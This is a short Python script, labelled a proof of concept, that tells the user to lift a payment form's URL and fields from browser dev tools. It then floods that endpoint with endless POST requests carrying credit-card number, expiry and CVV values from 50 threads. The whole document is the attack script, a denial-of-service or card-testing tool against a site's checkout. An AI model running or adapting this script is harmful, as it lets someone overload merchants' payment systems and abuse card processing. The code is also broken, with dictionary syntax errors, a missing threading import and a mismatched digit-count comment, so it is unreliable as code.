""" 
--- PoC ---
First goto: Chrome Dev Tools > Networks > Headers; find URL(to which requests are being made) and headers to include like card nos, etc.
"""

import requests

url = 'Enter_url_here'

data = {
'cc_number' = '4000583989234', # 14  digit number  
'cc_expmonth' = '6',
'cc_expyear' = '24',
'cc_cvv' = '243',
# Include all the other fields here 
} 

def send_requests():
    while True:
        response = requests.post(url, data=data).text
        print(response)

threads = []

for i in range(50):
    t = threading.Thread(target = send_requests)
    t.daemon = True
    threads.append(t)   

for i in range(50):
    threads[i].start()

for i in range(50):
    threads[i].join()
    